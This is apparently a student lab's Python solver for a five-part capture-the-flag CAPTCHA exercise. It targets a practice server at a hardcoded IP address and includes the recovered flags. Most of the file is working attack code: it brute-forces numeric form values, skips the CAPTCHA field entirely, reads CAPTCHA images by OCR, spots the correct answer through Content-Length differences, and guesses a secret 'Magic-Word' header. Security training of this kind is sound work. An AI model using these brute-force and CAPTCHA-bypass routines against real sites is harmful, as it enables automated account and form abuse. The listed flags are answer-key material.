"""
TP3 - Captcha Solver
Resout 5 challenges de CAPTCHA avec differentes techniques.

FLAGS TROUVES:
- Challenge 1: FLAG-1{1z1_one} (bypass sans captcha)
- Challenge 2: FLAG-2{4_l1ttl3_h4rder} (OCR, flag=2756)
- Challenge 3: FLAG-3{N0_t1m3_to_Sl33p} (OCR, flag=3889)
- Challenge 4: FLAG-4{B4d_Pr0tection} (Magic-Word: Trackflaw, flag=7629 + captcha)
- Challenge 5: Magic-Word inconnu
"""
import requests
import re
from .utils.config import logger


BASE_URL = "http://31.220.95.27:9002"


def get_ocr_captcha(session, base_url):
    """Lit le captcha avec OCR."""
    try:
        import pytesseract
        from PIL import Image, ImageOps
        from io import BytesIO
        import os
        
        if os.name == "nt":
            tesseract_path = r"C:\Program Files\Tesseract-OCR\tesseract.exe"
            if os.path.exists(tesseract_path):
                pytesseract.pytesseract.tesseract_cmd = tesseract_path
        
        r = session.get(f"{base_url}/captcha.php")
        img = Image.open(BytesIO(r.content))
        img = img.convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = ImageOps.autocontrast(img)
        
        captcha = pytesseract.image_to_string(
            img, config="--psm 7 -c tessedit_char_whitelist=0123456789"
        ).strip()
        return "".join(c for c in captcha if c.isdigit())
    except Exception as e:
        logger.warning(f"OCR error: {e}")
        return None


def solve_challenge_1():
    """Challenge 1: bypass sans captcha (1000-2000)."""
    logger.info("=== Challenge 1 (bypass) ===")
    url = f"{BASE_URL}/captcha1/"
    
    for flag in range(1000, 2001):
        s = requests.Session()
        s.get(url)
        
        r = s.post(url, data=f"flag={flag}&submit=Submit",
                   headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": url})
        
        if flag % 200 == 0:
            logger.info(f"  flag={flag}")
        
        if "Correct" in r.text:
            match = re.search(r"FLAG-\d+\{[^}]+\}", r.text)
            if match:
                return match.group(0)
            return f"flag={flag}"
    return None


def solve_challenge_by_content_length(ch_num, url, flag_min, flag_max, headers=None):
    """
    Challenges 2 et 3: bruteforce avec OCR, detection par Content-Length unique.
    Le bon flag a un Content-Length different des autres.
    """
    logger.info(f"=== Challenge {ch_num} (OCR + Content-Length) ===")
    
    lengths = {}
    
    for flag in range(flag_min, flag_max + 1):
        s = requests.Session()
        if headers:
            s.headers.update(headers)
        
        s.get(url)
        captcha = get_ocr_captcha(s, BASE_URL)
        
        if not captcha or len(captcha) != 6:
            continue
        
        h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
        if headers:
            h.update(headers)
        
        r = s.post(url, data=f"flag={flag}&captcha={captcha}&submit=Submit", headers=h)
        
        cl = r.headers.get("Content-Length", "0")
        if cl not in lengths:
            lengths[cl] = []
        lengths[cl].append(flag)
        
        if flag % 200 == 0:
            logger.info(f"  flag={flag}")
    
    # Trouver le flag avec Content-Length unique (plus grand = succes)
    for cl, flags in sorted(lengths.items(), key=lambda x: int(x[0]), reverse=True):
        if len(flags) == 1:
            candidate = flags[0]
            logger.info(f"  Candidat: flag={candidate} (CL={cl})")
            
            # Verifier ce flag
            s = requests.Session()
            if headers:
                s.headers.update(headers)
            s.get(url)
            captcha = get_ocr_captcha(s, BASE_URL)
            if captcha and len(captcha) == 6:
                h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
                if headers:
                    h.update(headers)
                r = s.post(url, data=f"flag={candidate}&captcha={captcha}&submit=Submit", headers=h)
                
                # Chercher le FLAG
                match = re.search(r"F\s*L\s*A\s*G\s*-\s*\d+\s*\{[^}]+\}", r.text)
                if match:
                    return match.group(0).replace(" ", "")
            
            return f"flag={candidate}"
    
    return None


def solve_challenge_4():
    """
    Challenge 4: Magic-Word: Trackflaw (7000-8000).
    2 etapes: 1) trouver le flag, 2) resoudre le captcha qui apparait.
    """
    logger.info("=== Challenge 4 (Magic-Word + 2 etapes) ===")
    url = f"{BASE_URL}/captcha4/"
    headers = {"Magic-Word": "Trackflaw"}
    
    # Etape 1: Trouver le bon flag
    found_flag = None
    for flag in range(7000, 8001):
        s = requests.Session()
        s.headers.update(headers)
        s.get(url)
        
        h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
        h.update(headers)
        r = s.post(url, data=f"flag={flag}&submit=Submit", headers=h)
        
        if flag % 200 == 0:
            logger.info(f"  flag={flag}")
        
        if "Correct" in r.text:
            found_flag = flag
            logger.info(f"  Flag trouve: {flag}")
            break
    
    if not found_flag:
        return None
    
    # Etape 2: Resoudre le captcha pour obtenir le vrai FLAG
    logger.info("  Etape 2: resolution du captcha...")
    s = requests.Session()
    s.headers.update(headers)
    s.get(url)
    
    # Soumettre le flag pour faire apparaitre le captcha
    h = {"Content-Type": "application/x-www-form-urlencoded", "Referer": url}
    h.update(headers)
    s.post(url, data=f"flag={found_flag}&submit=Submit", headers=h)
    
    # Resoudre le captcha
    captcha = get_ocr_captcha(s, BASE_URL)
    if not captcha or len(captcha) != 6:
        logger.warning("  Captcha OCR echoue")
        return f"flag={found_flag}"
    
    # Soumettre flag + captcha
    r = s.post(url, data=f"flag={found_flag}&captcha={captcha}&submit=Submit", headers=h)
    
    # Chercher le FLAG
    match = re.search(r"F\s*L\s*A\s*G\s*-\s*4\s*\{[^}]+\}", r.text)
    if match:
        return match.group(0).replace(" ", "")
    
    return f"flag={found_flag}"


def solve_challenge_5():
    """Challenge 5: Magic-Word inconnu."""
    logger.info("=== Challenge 5 ===")
    url = f"{BASE_URL}/captcha5/"
    
    # Tester quelques Magic-Words
    for word in ["Trackflaw", "please", "magic", "password"]:
        r = requests.get(url, headers={"Magic-Word": word})
        if r.status_code != 403:
            logger.info(f"Magic-Word trouve: {word}")
            # Continuer avec ce word
            break
    else:
        logger.warning("Magic-Word non trouve")
        return None
    
    return None


def main():
    """Point d'entree principal."""
    logger.info("=" * 50)
    logger.info("TP3 - Captcha Solver")
    logger.info("=" * 50)
    
    flags = {}
    
    # Challenge 1
    flags[1] = solve_challenge_1()
    if flags[1]:
        logger.info(f"*** FLAG 1: {flags[1]} ***")
    
    # Challenge 2
    flags[2] = solve_challenge_by_content_length(2, f"{BASE_URL}/captcha2/", 2000, 3000)
    if flags[2]:
        logger.info(f"*** FLAG 2: {flags[2]} ***")
    
    # Challenge 3
    flags[3] = solve_challenge_by_content_length(3, f"{BASE_URL}/captcha3/", 3000, 4000)
    if flags[3]:
        logger.info(f"*** FLAG 3: {flags[3]} ***")
    
    # Challenge 4
    flags[4] = solve_challenge_4()
    if flags[4]:
        logger.info(f"*** FLAG 4: {flags[4]} ***")
    
    # Challenge 5
    flags[5] = solve_challenge_5()
    if flags[5]:
        logger.info(f"*** FLAG 5: {flags[5]} ***")
    
    # Resume
    logger.info("\n" + "=" * 50)
    logger.info("RESUME DES FLAGS")
    logger.info("=" * 50)
    for i in range(1, 6):
        status = flags.get(i) or "Non trouve"
        logger.info(f"Challenge {i}: {status}")
    
    return flags


if __name__ == "__main__":
    main()
